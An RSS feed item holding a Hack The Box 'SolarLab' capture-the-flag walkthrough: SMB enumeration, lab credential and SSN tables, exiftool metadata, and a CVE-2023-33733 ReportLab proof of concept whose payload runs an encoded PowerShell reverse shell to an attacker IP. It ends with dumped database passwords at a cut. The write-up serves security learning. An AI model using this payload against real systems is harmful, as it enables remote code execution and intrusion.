<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
  <channel>
    <title>Windows on Shakil&#39;s Blog</title>
    <link>https://hshakilst.github.io/tags/windows/</link>
    <description>Recent content in Windows on Shakil&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Shakil Hossain - All Right Reserved.</copyright>
    <lastBuildDate>Thu, 16 May 2024 18:00:05 +0200</lastBuildDate><atom:link href="https://hshakilst.github.io/tags/windows/index.xml" rel="self" type="application/rss+xml" /><icon>https://hshakilst.github.io/logo.svg</icon>
    
    
    <item>
      <title>HTB Machine Solarlab</title>
      <link>https://hshakilst.github.io/posts/htb-machines/solarlab/</link>
      <pubDate>Thu, 16 May 2024 18:00:05 +0200</pubDate>
      
      <guid>https://hshakilst.github.io/posts/htb-machines/solarlab/</guid>
      <description><![CDATA[<h1 id="solar-lab---htbhttpsapphacktheboxcommachinessolarlab">Solar Lab - <a href="https://app.hackthebox.com/machines/SolarLab">HTB</a></h1>
<p><img src="images/image.png" alt="alt text"></p>
<h2 id="nmap">Nmap</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>PORT     STATE SERVICE       REASON  VERSION
</span></span><span style="display:flex;"><span>80/tcp   open  http          syn-ack nginx 1.24.0
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD
</span></span><span style="display:flex;"><span>|_http-title: SolarLab Instant Messenger
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.24.0
</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds? syn-ack
</span></span><span style="display:flex;"><span>6791/tcp open  http          syn-ack nginx 1.24.0
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.24.0
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>| smb2-time: 
</span></span><span style="display:flex;"><span>|   date: 2024-05-14T14:01:13
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>|_clock-skew: -5m11s
</span></span><span style="display:flex;"><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span>|   3:1:1: 
</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
</span></span><span style="display:flex;"><span>| p2p-conficker: 
</span></span><span style="display:flex;"><span>|   Checking for Conficker.C or higher...
</span></span><span style="display:flex;"><span>|   Check 1 (port 64857/tcp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|   Check 2 (port 37138/tcp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|   Check 3 (port 48381/udp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|   Check 4 (port 52237/udp): CLEAN (Timeout)
</span></span><span style="display:flex;"><span>|_  0/4 checks are positive: Host is CLEAN or ports are blocked
</span></span></code></pre></div><h2 id="http-enumeration">HTTP Enumeration</h2>
<p><strong><a href="http://report.solarlab.htb:6791">http://report.solarlab.htb:6791</a></strong></p>
<p><img src="images/report_portal.png" alt="Login Portal"></p>
<p>Unfortunately couldn&rsquo;t log in, no credential was available.</p>
<h2 id="smb-enumeration">SMB Enumeration</h2>
<p>Message signing enabled but not required.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ smbclient --no-pass -L //10.10.11.16    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Sharename       Type      Comment
</span></span><span style="display:flex;"><span>	---------       ----      -------
</span></span><span style="display:flex;"><span>	ADMIN$          Disk      Remote Admin
</span></span><span style="display:flex;"><span>	C$              Disk      Default share
</span></span><span style="display:flex;"><span>	Documents       Disk      
</span></span><span style="display:flex;"><span>	IPC$            IPC       Remote IPC
</span></span></code></pre></div><p><code>Documents</code> share was interesting so let&rsquo;s connect and list the contents of it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ smbclient --no-pass  //10.10.11.16/Documents
</span></span><span style="display:flex;"><span>Try &#34;help&#34; to get a list of possible commands.
</span></span><span style="display:flex;"><span>smb: \&gt; dir
</span></span><span style="display:flex;"><span>  .                                  DR        0  Fri Apr 26 16:47:14 2024
</span></span><span style="display:flex;"><span>  ..                                 DR        0  Fri Apr 26 16:47:14 2024
</span></span><span style="display:flex;"><span>  concepts                            D        0  Fri Apr 26 16:41:57 2024
</span></span><span style="display:flex;"><span>  desktop.ini                       AHS      278  Fri Nov 17 10:54:43 2023
</span></span><span style="display:flex;"><span>  details-file.xlsx                   A    12793  Fri Nov 17 12:27:21 2023
</span></span><span style="display:flex;"><span>  My Music                        DHSrn        0  Thu Nov 16 19:36:51 2023
</span></span><span style="display:flex;"><span>  My Pictures                     DHSrn        0  Thu Nov 16 19:36:51 2023
</span></span><span style="display:flex;"><span>  My Videos                       DHSrn        0  Thu Nov 16 19:36:51 2023
</span></span><span style="display:flex;"><span>  old_leave_request_form.docx         A    37194  Fri Nov 17 10:35:57 2023
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		7779839 blocks of size 4096. 1885790 blocks available
</span></span><span style="display:flex;"><span>smb: \&gt; 
</span></span></code></pre></div><p>There are some document files stored in the share. Let&rsquo;s download them and analyze.</p>
<h2 id="exif-metadata-analysis">EXIF Metadata Analysis</h2>
<ul>
<li>
<p><strong>old_leave_request_form.docx</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ExifTool Version Number         : 12.76
</span></span><span style="display:flex;"><span>File Name                       : old_leave_request_form.docx
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : 37 kB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2024:05:14 17:16:22+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:05:14 17:20:03+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:05:14 17:16:22+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : DOCX
</span></span><span style="display:flex;"><span>File Type Extension             : docx
</span></span><span style="display:flex;"><span>MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
</span></span><span style="display:flex;"><span>Zip Required Version            : 20
</span></span><span style="display:flex;"><span>Zip Bit Flag                    : 0x0006
</span></span><span style="display:flex;"><span>Zip Compression                 : Deflated
</span></span><span style="display:flex;"><span>Zip Modify Date                 : 1980:01:01 00:00:00
</span></span><span style="display:flex;"><span>Zip CRC                         : 0x5c9ce90a
</span></span><span style="display:flex;"><span>Zip Compressed Size             : 483
</span></span><span style="display:flex;"><span>Zip Uncompressed Size           : 2460
</span></span><span style="display:flex;"><span>Zip File Name                   : [Content_Types].xml
</span></span><span style="display:flex;"><span>_NewReviewCycle                 : 
</span></span><span style="display:flex;"><span>Creator                         : Alison Melville
</span></span><span style="display:flex;"><span>Last Modified By                : Jackie
</span></span><span style="display:flex;"><span>Revision Number                 : 3
</span></span><span style="display:flex;"><span>Create Date                     : 2015:07:06 22:19:00Z
</span></span><span style="display:flex;"><span>Modify Date                     : 2015:08:03 16:50:00Z
</span></span><span style="display:flex;"><span>Template                        : Normal
</span></span><span style="display:flex;"><span>Total Edit Time                 : 1 minute
</span></span><span style="display:flex;"><span>Pages                           : 1
</span></span><span style="display:flex;"><span>Words                           : 142
</span></span><span style="display:flex;"><span>Characters                      : 814
</span></span><span style="display:flex;"><span>Application                     : Microsoft Office Word
</span></span><span style="display:flex;"><span>Doc Security                    : None
</span></span><span style="display:flex;"><span>Lines                           : 6
</span></span><span style="display:flex;"><span>Paragraphs                      : 1
</span></span><span style="display:flex;"><span>Scale Crop                      : No
</span></span><span style="display:flex;"><span>Heading Pairs                   : Title, 1
</span></span><span style="display:flex;"><span>Titles Of Parts                 : 
</span></span><span style="display:flex;"><span>Company                         : Greig Melville Associates Limited
</span></span><span style="display:flex;"><span>Links Up To Date                : No
</span></span><span style="display:flex;"><span>Characters With Spaces          : 955
</span></span><span style="display:flex;"><span>Shared Doc                      : No
</span></span><span style="display:flex;"><span>Hyperlinks Changed              : No
</span></span><span style="display:flex;"><span>App Version                     : 14.0000
</span></span></code></pre></div></li>
<li>
<p><strong>details-file.xlsx</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ExifTool Version Number         : 12.76
</span></span><span style="display:flex;"><span>File Name                       : details-file.xlsx
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : 13 kB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2024:05:14 17:16:11+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:05:14 17:21:24+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:05:14 17:16:11+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : XLSX
</span></span><span style="display:flex;"><span>File Type Extension             : xlsx
</span></span><span style="display:flex;"><span>MIME Type                       : application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
</span></span><span style="display:flex;"><span>Zip Required Version            : 20
</span></span><span style="display:flex;"><span>Zip Bit Flag                    : 0x0006
</span></span><span style="display:flex;"><span>Zip Compression                 : Deflated
</span></span><span style="display:flex;"><span>Zip Modify Date                 : 1980:01:01 00:00:00
</span></span><span style="display:flex;"><span>Zip CRC                         : 0xd125f54a
</span></span><span style="display:flex;"><span>Zip Compressed Size             : 388
</span></span><span style="display:flex;"><span>Zip Uncompressed Size           : 1681
</span></span><span style="display:flex;"><span>Zip File Name                   : [Content_Types].xml
</span></span><span style="display:flex;"><span>Creator                         : College of Education
</span></span><span style="display:flex;"><span>Last Modified By                : Paul Serban
</span></span><span style="display:flex;"><span>Create Date                     : 2011:03:24 14:38:51Z
</span></span><span style="display:flex;"><span>Modify Date                     : 2023:11:17 12:27:21Z
</span></span><span style="display:flex;"><span>Application                     : Microsoft Excel
</span></span><span style="display:flex;"><span>Doc Security                    : None
</span></span><span style="display:flex;"><span>Scale Crop                      : No
</span></span><span style="display:flex;"><span>Heading Pairs                   : Worksheets, 3
</span></span><span style="display:flex;"><span>Titles Of Parts                 : Sheet1, Sheet2, Sheet3
</span></span><span style="display:flex;"><span>Company                         : Purdue University
</span></span><span style="display:flex;"><span>Links Up To Date                : No
</span></span><span style="display:flex;"><span>Shared Doc                      : No
</span></span><span style="display:flex;"><span>Hyperlinks Changed              : No
</span></span><span style="display:flex;"><span>App Version                     : 16.0300
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_Enabled: true
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_SetDate: 2023-11-17T10:41:19Z
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_Method: Standard
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_Name: All Employees_2
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_SiteId: 33440fc6-b7c7-412c-bb73-0e70b0198d5a
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_ActionId: c1afab2c-84d2-450d-9066-dcc727984137
</span></span><span style="display:flex;"><span>MSIP_Label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_ContentBits: 0
</span></span></code></pre></div><p>This file contains MIP Metadata which are part of <code>Microsoft Information Protection SDK - Metadata</code>. So it might contain some juicy informations.</p>
</li>
<li>
<p><strong>Training-Request-Form.docx</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ExifTool Version Number         : 12.76
</span></span><span style="display:flex;"><span>File Name                       : Training-Request-Form.docx
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : 161 kB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2024:05:14 17:16:49+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:05:14 17:20:39+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:05:14 17:16:49+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : DOCX
</span></span><span style="display:flex;"><span>File Type Extension             : docx
</span></span><span style="display:flex;"><span>MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
</span></span><span style="display:flex;"><span>Zip Required Version            : 20
</span></span><span style="display:flex;"><span>Zip Bit Flag                    : 0x0006
</span></span><span style="display:flex;"><span>Zip Compression                 : Deflated
</span></span><span style="display:flex;"><span>Zip Modify Date                 : 1980:01:01 00:00:00
</span></span><span style="display:flex;"><span>Zip CRC                         : 0xd2250c4f
</span></span><span style="display:flex;"><span>Zip Compressed Size             : 470
</span></span><span style="display:flex;"><span>Zip Uncompressed Size           : 2223
</span></span><span style="display:flex;"><span>Zip File Name                   : [Content_Types].xml
</span></span><span style="display:flex;"><span>Creator                         : Gayle.Rennie
</span></span><span style="display:flex;"><span>Last Modified By                : FRYATT, Susanne (WGPSN)
</span></span><span style="display:flex;"><span>Revision Number                 : 2
</span></span><span style="display:flex;"><span>Create Date                     : 2018:07:20 08:11:00Z
</span></span><span style="display:flex;"><span>Modify Date                     : 2018:07:20 08:11:00Z
</span></span><span style="display:flex;"><span>Template                        : Normal.dotm
</span></span><span style="display:flex;"><span>Total Edit Time                 : 44 minutes
</span></span><span style="display:flex;"><span>Pages                           : 1
</span></span><span style="display:flex;"><span>Words                           : 188
</span></span><span style="display:flex;"><span>Characters                      : 1078
</span></span><span style="display:flex;"><span>Application                     : Microsoft Office Word
</span></span><span style="display:flex;"><span>Doc Security                    : None
</span></span><span style="display:flex;"><span>Lines                           : 8
</span></span><span style="display:flex;"><span>Paragraphs                      : 2
</span></span><span style="display:flex;"><span>Scale Crop                      : No
</span></span><span style="display:flex;"><span>Heading Pairs                   : Title, 1
</span></span><span style="display:flex;"><span>Titles Of Parts                 : 
</span></span><span style="display:flex;"><span>Company                         : Wood Group
</span></span><span style="display:flex;"><span>Links Up To Date                : No
</span></span><span style="display:flex;"><span>Characters With Spaces          : 1264
</span></span><span style="display:flex;"><span>Shared Doc                      : No
</span></span><span style="display:flex;"><span>Hyperlinks Changed              : No
</span></span><span style="display:flex;"><span>App Version                     : 14.0000
</span></span></code></pre></div></li>
<li>
<p><strong>Travel-Request-Sample.docx</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ExifTool Version Number         : 12.76
</span></span><span style="display:flex;"><span>File Name                       : Travel-Request-Sample.docx
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : 31 kB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2024:05:14 17:16:55+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:05:14 17:21:02+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:05:14 17:16:55+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : DOCX
</span></span><span style="display:flex;"><span>File Type Extension             : docx
</span></span><span style="display:flex;"><span>MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
</span></span><span style="display:flex;"><span>Zip Required Version            : 20
</span></span><span style="display:flex;"><span>Zip Bit Flag                    : 0x0006
</span></span><span style="display:flex;"><span>Zip Compression                 : Deflated
</span></span><span style="display:flex;"><span>Zip Modify Date                 : 1980:01:01 00:00:00
</span></span><span style="display:flex;"><span>Zip CRC                         : 0x7d32bdda
</span></span><span style="display:flex;"><span>Zip Compressed Size             : 440
</span></span><span style="display:flex;"><span>Zip Uncompressed Size           : 1997
</span></span><span style="display:flex;"><span>Zip File Name                   : [Content_Types].xml
</span></span><span style="display:flex;"><span>Title                           : 
</span></span><span style="display:flex;"><span>Subject                         : 
</span></span><span style="display:flex;"><span>Creator                         : Paul Squillace
</span></span><span style="display:flex;"><span>Keywords                        : 
</span></span><span style="display:flex;"><span>Description                     : 
</span></span><span style="display:flex;"><span>Last Modified By                : Katy Brown
</span></span><span style="display:flex;"><span>Revision Number                 : 2
</span></span><span style="display:flex;"><span>Create Date                     : 2015:06:14 14:49:00Z
</span></span><span style="display:flex;"><span>Modify Date                     : 2015:06:14 14:49:00Z
</span></span><span style="display:flex;"><span>Template                        : Normal.dotm
</span></span><span style="display:flex;"><span>Total Edit Time                 : 1 minute
</span></span><span style="display:flex;"><span>Pages                           : 1
</span></span><span style="display:flex;"><span>Words                           : 351
</span></span><span style="display:flex;"><span>Characters                      : 2003
</span></span><span style="display:flex;"><span>Application                     : Microsoft Macintosh Word
</span></span><span style="display:flex;"><span>Doc Security                    : Read-only enforced
</span></span><span style="display:flex;"><span>Lines                           : 16
</span></span><span style="display:flex;"><span>Paragraphs                      : 4
</span></span><span style="display:flex;"><span>Scale Crop                      : No
</span></span><span style="display:flex;"><span>Heading Pairs                   : Title, 1
</span></span><span style="display:flex;"><span>Titles Of Parts                 : 
</span></span><span style="display:flex;"><span>Company                         : Microsoft
</span></span><span style="display:flex;"><span>Links Up To Date                : No
</span></span><span style="display:flex;"><span>Characters With Spaces          : 2350
</span></span><span style="display:flex;"><span>Shared Doc                      : No
</span></span><span style="display:flex;"><span>Hyperlinks Changed              : No
</span></span><span style="display:flex;"><span>App Version                     : 14.0000
</span></span></code></pre></div></li>
</ul>
<h2 id="credentials">Credentials</h2>
<p>The <strong>details-file.xlsx</strong> contained sensitive information.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Password File							
</span></span><span style="display:flex;"><span>                            
</span></span><span style="display:flex;"><span>Alexander&#39;s SSN		123-23-5424					
</span></span><span style="display:flex;"><span>Claudia&#39;s SSN		820-378-3984					
</span></span><span style="display:flex;"><span>Blake&#39;s SSN		739-1846-436
</span></span></code></pre></div><table>
<thead>
<tr>
<th>Site</th>
<th>Account#</th>
<th>Username</th>
<th>Password</th>
<th>Security Question</th>
<th>Answer</th>
<th>Email</th>
<th>Other information</th>
</tr>
</thead>
<tbody>
<tr>
<td>Amazon.com</td>
<td>101-333</td>
<td><a href="mailto:Alexander.knight@gmail.com">Alexander.knight@gmail.com</a></td>
<td>al;ksdhfewoiuh</td>
<td>What was your mother&rsquo;s maiden name?</td>
<td>Blue</td>
<td><a href="mailto:Alexander.knight@gmail.com">Alexander.knight@gmail.com</a></td>
<td></td>
</tr>
<tr>
<td>Pefcu</td>
<td>A233J</td>
<td>KAlexander</td>
<td>dkjafblkjadsfgl</td>
<td>What was your high school mascot</td>
<td>Pine Tree</td>
<td><a href="mailto:Alexander.knight@gmail.com">Alexander.knight@gmail.com</a></td>
<td></td>
</tr>
<tr>
<td>Chase</td>
<td></td>
<td><a href="mailto:Alexander.knight@gmail.com">Alexander.knight@gmail.com</a></td>
<td>d398sadsknr390</td>
<td>What was the name of your first pet?</td>
<td>corvette</td>
<td><a href="mailto:Claudia.springer@gmail.com">Claudia.springer@gmail.com</a></td>
<td></td>
</tr>
<tr>
<td>Fidelity</td>
<td></td>
<td>blake.byte</td>
<td>ThisCanB3typedeasily1@</td>
<td>What was your mother&rsquo;s maiden name?</td>
<td>Helena	blake@purdue.edu</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Signa</td>
<td></td>
<td>AlexanderK</td>
<td>danenacia9234n</td>
<td>What was your mother&rsquo;s maiden name?</td>
<td>Poppyseed muffins</td>
<td><a href="mailto:Alexander.knight@gmail.com">Alexander.knight@gmail.com</a></td>
<td>account number: 1925-47218-30</td>
</tr>
<tr>
<td></td>
<td></td>
<td>ClaudiaS</td>
<td>dadsfawe9dafkn</td>
<td>What was your mother&rsquo;s maiden name?</td>
<td>yellow crayon</td>
<td><a href="mailto:Claudia.springer@gmail.com">Claudia.springer@gmail.com</a></td>
<td>account number: 3872-03498-45</td>
</tr>
<tr>
<td>Comcast</td>
<td>JHG3434</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Vectren</td>
<td>YUIO576</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Verizon</td>
<td>1111-5555-33</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>With the above credentials I tried to login to the <code>report.solarlab.htb:6791</code> and found a match. Apparently, the username structure for this organization is <code>Firstname + Lastname Initial</code>.</p>
<p>The matched credential is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>**********:ThisCanB3typedeasily1@
</span></span></code></pre></div><h2 id="enumerating-the-report-portal-dashboard">Enumerating The Report Portal Dashboard</h2>
<p><img src="images/report_dashboard.png" alt="Report Portal Dashboard"></p>
<p>It was a portal for sending/approving leave request/vacation approval etc. After filling the form and <strong>uploading a image</strong> for attaching signature, Ait generated a pdf file.</p>
<p><img src="images/generated_pdf.png" alt="Generated PDF"></p>
<p>Examining the generated pdf file with exiftool I discovered it was using <code>ReportLab PDF Library</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ExifTool Version Number         : 12.76
</span></span><span style="display:flex;"><span>File Name                       : output.pdf
</span></span><span style="display:flex;"><span>Directory                       : .
</span></span><span style="display:flex;"><span>File Size                       : 277 kB
</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2024:05:14 19:24:09+02:00
</span></span><span style="display:flex;"><span>File Access Date/Time           : 2024:05:14 19:24:09+02:00
</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2024:05:14 19:24:09+02:00
</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
</span></span><span style="display:flex;"><span>File Type                       : PDF
</span></span><span style="display:flex;"><span>File Type Extension             : pdf
</span></span><span style="display:flex;"><span>MIME Type                       : application/pdf
</span></span><span style="display:flex;"><span>PDF Version                     : 1.4
</span></span><span style="display:flex;"><span>Linearized                      : No
</span></span><span style="display:flex;"><span>Author                          : (anonymous)
</span></span><span style="display:flex;"><span>Create Date                     : 2024:05:14 20:18:13-02:00
</span></span><span style="display:flex;"><span>Creator                         : (unspecified)
</span></span><span style="display:flex;"><span>Modify Date                     : 2024:05:14 20:18:13-02:00
</span></span><span style="display:flex;"><span>Producer                        : ReportLab PDF Library - www.reportlab.com
</span></span><span style="display:flex;"><span>Subject                         : (unspecified)
</span></span><span style="display:flex;"><span>Title                           : (anonymous)
</span></span><span style="display:flex;"><span>Trapped                         : False
</span></span><span style="display:flex;"><span>Page Mode                       : UseNone
</span></span><span style="display:flex;"><span>Page Count                      : 1
</span></span></code></pre></div><p>A quick search for this library resulted in that this library maybe (because I couldn&rsquo;t determine the version of the library) vulnerable to an RCE. Read more about it on <a href="https://www.bleepingcomputer.com/news/security/exploit-released-for-rce-flaw-in-popular-reportlab-pdf-library/">BleepingComputer</a>.</p>
<p>A publicly available PoC was released on <a href="https://github.com/c53elyas/CVE-2023-33733">Github</a>.</p>
<p>The vulnerability was due to how it handled converting HTML to PDF (the flaw in xhtml2pdf).</p>
<p><strong>PoC:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;para&gt;
</span></span><span style="display:flex;"><span>    &lt;font
</span></span><span style="display:flex;"><span>        color=&#34;[ [ getattr(pow,Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANAA2ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&#39;) for Word in [orgTypeFun(&#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: False, &#39;__eq__&#39;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: {setattr(self, &#39;mutated&#39;, self.mutated - 1)}, &#39;__hash__&#39;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and &#39;red&#39;&#34;&gt;
</span></span><span style="display:flex;"><span>        exploit
</span></span><span style="display:flex;"><span>    &lt;/font&gt;
</span></span><span style="display:flex;"><span>&lt;/para&gt;
</span></span></code></pre></div><p><strong>Delivery:</strong></p>
<p>The <code>justification</code> field is limited by 300 characters so it cannot be used also we cannot attach html file. And the date section is accepts date range. So that leaves <code>ome_office_request</code> parameter to deliver the payload.</p>
<h2 id="foothold">Foothold</h2>
<p>We got a shell as blake and our user flag.</p>
<h2 id="privesc-enumeration">PrivEsc Enumeration</h2>
<p>I found a sqlite database inside the <code>app/instance</code> directory.</p>
<ul>
<li>
<p><strong>users.db</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>1	blakeb	ThisCanB3typedeasily1@
</span></span><span style="display:flex;"><span>2	claudias	007poiuytrewq
</span></span><span style="display:flex;"><span>3	alexanderk	HotP!fireguard
</span></span></code></pre></div></li>
<li>
<p><strong>Current User Info</strong></p>
